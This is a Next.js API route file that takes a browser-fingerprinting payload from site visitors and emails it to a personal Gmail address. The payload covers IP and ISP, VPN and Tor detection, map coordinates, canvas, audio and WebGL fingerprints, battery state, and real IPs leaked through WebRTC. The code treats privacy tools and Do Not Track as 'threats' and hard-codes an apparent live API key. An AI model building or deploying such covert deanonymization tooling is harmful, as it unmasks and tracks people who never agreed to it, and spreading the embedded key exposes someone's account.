// app/api/instant/route.ts
// Instant intelligence collection - sends within 0.5-1s of page load

import { NextRequest, NextResponse } from 'next/server';
import { Resend } from 'resend';

const resend = new Resend(process.env.RESEND_API_KEY || 're_dbucvqvg_6nVX9uBbM1bfoKtjAA46zCvW');

interface InstantIntelligence {
  sessionId: string;
  timestamp: string;
  loadTime: number;
  ip: {
    address: string;
    vpnDetected: boolean;
    proxyDetected: boolean;
    torDetected: boolean;
    datacenter: boolean;
    isp: string;
    org: string;
    asn: string;
  };
  location: {
    city: string;
    region: string;
    country: string;
    countryCode: string;
    timezone: string;
    lat: number;
    lon: number;
  };
  device: {
    userAgent: string;
    platform: string;
    vendor: string;
    language: string;
    languages: string[];
    cookiesEnabled: boolean;
    doNotTrack: string | null;
    hardwareConcurrency: number;
    deviceMemory: number;
    maxTouchPoints: number;
    screenWidth: number;
    screenHeight: number;
    screenColorDepth: number;
    pixelRatio: number;
    timezone: string;
    timezoneOffset: number;
  };
  browser: {
    webglVendor: string;
    webglRenderer: string;
    canvasFingerprint: string;
    audioFingerprint: string;
  };
  network: {
    effectiveType: string;
    downlink: number;
    rtt: number;
    saveData: boolean;
    connectionType: string;
  };
  webrtc: {
    available: boolean;
    localIPs: string[];
    publicIPs: string[];
    ipv6IPs: string[];
    leakDetected: boolean;
  };
  referrer: string;
  entryUrl: string;
  screenOrientation: string;
  batteryLevel?: number;
  batteryCharging?: boolean;
}

export async function POST(request: NextRequest) {
  const startTime = Date.now();

  try {
    const data: InstantIntelligence = await request.json();

    // Get additional server-side headers
    const headers = {
      forwardedFor: request.headers.get('x-forwarded-for'),
      realIp: request.headers.get('x-real-ip'),
      cfConnectingIp: request.headers.get('cf-connecting-ip'),
      cfIpCountry: request.headers.get('cf-ipcountry'),
      userAgent: request.headers.get('user-agent'),
      acceptLanguage: request.headers.get('accept-language'),
      referer: request.headers.get('referer'),
    };

    // Format timestamp
    const timestamp = new Date(data.timestamp);
    const formattedTime = timestamp.toLocaleString('en-US', {
      weekday: 'long',
      year: 'numeric',
      month: 'long',
      day: 'numeric',
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
      timeZoneName: 'short',
    });

    // Determine threat level
    let threatLevel = '🟢 LOW';
    let threatIndicators: string[] = [];

    if (data.ip.vpnDetected) {
      threatLevel = '🟡 MEDIUM';
      threatIndicators.push('VPN Detected');
    }
    if (data.ip.proxyDetected) {
      threatLevel = '🟡 MEDIUM';
      threatIndicators.push('Proxy Detected');
    }
    if (data.ip.torDetected) {
      threatLevel = '🔴 HIGH';
      threatIndicators.push('TOR Network');
    }
    if (data.ip.datacenter) {
      threatLevel = '🟡 MEDIUM';
      threatIndicators.push('Datacenter IP');
    }
    if (data.webrtc.leakDetected) {
      threatIndicators.push('WebRTC Leak Found');
    }

    // Check for timezone mismatch
    const browserTz = data.device.timezone;
    const ipTz = data.location.timezone;
    if (browserTz && ipTz && browserTz !== ipTz) {
      threatIndicators.push(`Timezone Mismatch: Browser(${browserTz}) vs IP(${ipTz})`);
    }

    // Check for suspicious device characteristics
    if (data.device.hardwareConcurrency === 0) {
      threatIndicators.push('Hardware spoofing detected');
    }
    if (!data.device.cookiesEnabled) {
      threatIndicators.push('Cookies disabled');
    }
    if (data.device.doNotTrack === '1') {
      threatIndicators.push('DNT enabled');
    }

    // Google Maps link
    const mapsLink = `https://www.google.com/maps?q=${data.location.lat},${data.location.lon}`;

    // Generate email
    const emailBody = `
════════════════════════════════════════════════════════════════
⚡ INSTANT VISITOR DETECTION - ${data.loadTime}ms
════════════════════════════════════════════════════════════════

📅 Time: ${formattedTime}
🆔 Session: ${data.sessionId}
⏱️ Page Load: ${data.loadTime}ms
🔗 Entry URL: ${data.entryUrl}
📍 Referrer: ${data.referrer || 'Direct'}

════════════════════════════════════════════════════════════════
🌐 NETWORK INTELLIGENCE
════════════════════════════════════════════════════════════════

IP Address: ${data.ip.address}
ISP: ${data.ip.isp}
Organization: ${data.ip.org}
ASN: ${data.ip.asn}

VPN Detected: ${data.ip.vpnDetected ? '🔴 YES' : '🟢 NO'}
Proxy Detected: ${data.ip.proxyDetected ? '🔴 YES' : '🟢 NO'}
TOR Network: ${data.ip.torDetected ? '🔴 YES' : '🟢 NO'}
Datacenter IP: ${data.ip.datacenter ? '🟡 YES' : '🟢 NO'}

Connection Type: ${data.network.connectionType || data.network.effectiveType}
Downlink Speed: ${data.network.downlink} Mbps
Latency (RTT): ${data.network.rtt}ms
Data Saver: ${data.network.saveData ? 'Enabled' : 'Disabled'}

════════════════════════════════════════════════════════════════
📍 LOCATION DATA
════════════════════════════════════════════════════════════════

City: ${data.location.city}
Region: ${data.location.region}
Country: ${data.location.country} (${data.location.countryCode})
Timezone: ${data.location.timezone}
Coordinates: ${data.location.lat}, ${data.location.lon}

🗺️ View on Map: ${mapsLink}

════════════════════════════════════════════════════════════════
🖥️ DEVICE FINGERPRINT
════════════════════════════════════════════════════════════════

User Agent: ${data.device.userAgent}
Platform: ${data.device.platform}
Vendor: ${data.device.vendor}
Language: ${data.device.language}
All Languages: ${data.device.languages?.join(', ') || 'N/A'}

Screen: ${data.device.screenWidth}x${data.device.screenHeight}
Pixel Ratio: ${data.device.pixelRatio}
Color Depth: ${data.device.screenColorDepth}-bit
Orientation: ${data.screenOrientation}

CPU Cores: ${data.device.hardwareConcurrency}
Device Memory: ${data.device.deviceMemory}GB
Touch Points: ${data.device.maxTouchPoints}

Cookies: ${data.device.cookiesEnabled ? 'Enabled' : 'Disabled'}
DNT: ${data.device.doNotTrack || 'Not Set'}

Browser Timezone: ${data.device.timezone}
Timezone Offset: UTC${data.device.timezoneOffset > 0 ? '-' : '+'}${Math.abs(data.device.timezoneOffset / 60)}

${data.batteryLevel !== undefined ? `Battery: ${Math.round(data.batteryLevel * 100)}% ${data.batteryCharging ? '(Charging)' : '(Discharging)'}` : ''}

════════════════════════════════════════════════════════════════
🔧 BROWSER FINGERPRINT
════════════════════════════════════════════════════════════════

WebGL Vendor: ${data.browser.webglVendor}
WebGL Renderer: ${data.browser.webglRenderer}
Canvas FP: ${data.browser.canvasFingerprint}
Audio FP: ${data.browser.audioFingerprint}

════════════════════════════════════════════════════════════════
🔓 WEBRTC LEAK DETECTION
════════════════════════════════════════════════════════════════

WebRTC Available: ${data.webrtc.available ? 'Yes' : 'No'}
Leak Detected: ${data.webrtc.leakDetected ? '🔴 YES - REAL IP EXPOSED!' : '🟢 No'}

Local IPs: ${data.webrtc.localIPs?.join(', ') || 'None'}
Public IPs: ${data.webrtc.publicIPs?.join(', ') || 'None'}
IPv6 IPs: ${data.webrtc.ipv6IPs?.join(', ') || 'None'}

${data.webrtc.leakDetected && data.webrtc.publicIPs?.length ? `
⚠️ REAL IP LEAKED: ${data.webrtc.publicIPs.filter(ip => ip !== data.ip.address).join(', ')}
` : ''}

════════════════════════════════════════════════════════════════
🛡️ SERVER-SIDE HEADERS
════════════════════════════════════════════════════════════════

X-Forwarded-For: ${headers.forwardedFor || 'Not present'}
X-Real-IP: ${headers.realIp || 'Not present'}
CF-Connecting-IP: ${headers.cfConnectingIp || 'Not present'}
CF-IPCountry: ${headers.cfIpCountry || 'Not present'}
Accept-Language: ${headers.acceptLanguage || 'Not present'}
Referer: ${headers.referer || 'Not present'}

════════════════════════════════════════════════════════════════
⚠️ THREAT ASSESSMENT
════════════════════════════════════════════════════════════════

Overall Threat Level: ${threatLevel}

${threatIndicators.length > 0 ? `Indicators:
${threatIndicators.map(i => `  • ${i}`).join('\n')}` : 'No threat indicators detected.'}

════════════════════════════════════════════════════════════════
Processing Time: ${Date.now() - startTime}ms
════════════════════════════════════════════════════════════════
`;

    // Send email immediately
    try {
      await resend.emails.send({
        from: 'Instant Alert <onboarding@resend.dev>',
        to: ['shaidt137@gmail.com'],
        subject: `⚡ INSTANT: Visitor from ${data.location.city}, ${data.location.country} ${threatLevel}`,
        text: emailBody,
      });
      console.log('⚡ Instant intelligence email sent in', Date.now() - startTime, 'ms');
    } catch (emailError: any) {
      console.error('❌ Instant email failed:', emailError.message);
    }

    return NextResponse.json({
      success: true,
      processingTime: Date.now() - startTime,
      sessionId: data.sessionId,
    });

  } catch (error: any) {
    console.error('Instant intelligence error:', error);
    return NextResponse.json(
      { success: false, error: 'Processing failed' },
      { status: 500 }
    );
  }
}
